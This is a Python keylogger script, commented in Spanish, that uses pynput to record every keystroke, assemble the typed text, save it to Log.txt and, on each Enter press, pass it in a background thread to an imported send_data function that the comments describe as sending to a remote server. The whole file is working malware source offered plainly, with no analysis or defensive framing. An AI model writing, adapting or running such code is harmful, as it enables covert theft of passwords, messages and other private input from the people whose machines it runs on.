import re
import threading
from pynput.keyboard import Key, Listener
from send_data import send_data
# Lista de palabras clave que el programa buscará en las pulsaciones de teclas
keywords = ["Enter"]
# Lista para almacenar las teclas presionadas hasta el momento
sensitive_data = []
ignore = [Key.backspace, Key.ctrl_l, Key.cmd, Key.right, Key.left, Key.up,Key.shift_r,Key.down,Key.tab,Key.caps_lock,Key.shift,Key.scroll_lock]
# Función que se ejecuta cada vez que se presiona una tecla
def get_click(tecla):
    # Lee la tecla presionada utilizando la biblioteca keyboard
    letra = tecla
    # Si la tecla no se puede leer, se convierte en una cadena
    if tecla in ignore:
        tecla = ''
    if tecla == Key.space:
        tecla = ' '
    letra = str(tecla)
    # Omite el registro de ciertas teclas como 'back', 'shift' y 'lock'
    # Agrega la tecla a la lista sensitive_data y convierte la lista en una cadena
    text = ""
    sensitive_data.append(letra)
    print(sensitive_data)
    for key in sensitive_data:
            key = str(key).replace("'", "")
            text += key

    print(text)

    # Verifica si alguna palabra clave está presente en el texto usando expresiones regulares
    if any(re.search(keyword, text, re.I) for keyword in keywords):
        print("Información sensible detectada! Enviando datos...")
        # Llama a la función para enviar datos al servidor remoto
        text = text.replace("Key.enter","")
        f = open("Log.txt",'w')
        f.write(text) 
        h1 = threading.Thread(target=send_data, args=(text,))
        h1.start()
        print(sensitive_data)
        # Limpia la lista sensitive_data
        sensitive_data.clear()
        f.close()
    else:
        print("Sin data sensible")
        


# Inicia el keylogger utilizando pynput.keyboard.Listener
with Listener(on_press=get_click) as listener:
    # Se queda en un bucle infinito para escuchar continuamente las pulsaciones de teclas
    listener.join()
